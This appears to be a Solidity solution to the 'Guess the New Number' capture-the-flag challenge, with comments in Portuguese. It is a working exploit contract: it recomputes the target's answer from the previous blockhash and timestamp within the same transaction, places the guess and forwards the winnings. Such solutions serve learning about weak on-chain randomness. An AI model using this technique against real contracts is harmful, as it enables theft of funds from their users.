pragma solidity ^0.4.21;

interface GuessTheNewNumberChallenge {
    function guess(uint8 n) external payable;
}

contract Attacker {
    function attack(address challengeAddress) public payable {
        require(msg.value == 1 ether);
        
        // Calcular o número da mesma forma que o contrato
        // answer = uint8(keccak256(block.blockhash(block.number - 1), now))
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        
        // Chamar guess() na mesma transação
        // Em Solidity 0.4.21, usamos .value() para enviar ether
        GuessTheNewNumberChallenge challenge = GuessTheNewNumberChallenge(challengeAddress);
        challenge.guess.value(1 ether)(answer);
        
        // O challenge transfere 2 ether de volta para msg.sender (este contrato)
        // Transferir de volta para o atacante original
        msg.sender.transfer(address(this).balance);
    }
    
    // Função fallback para receber ether
    function() public payable {}
}

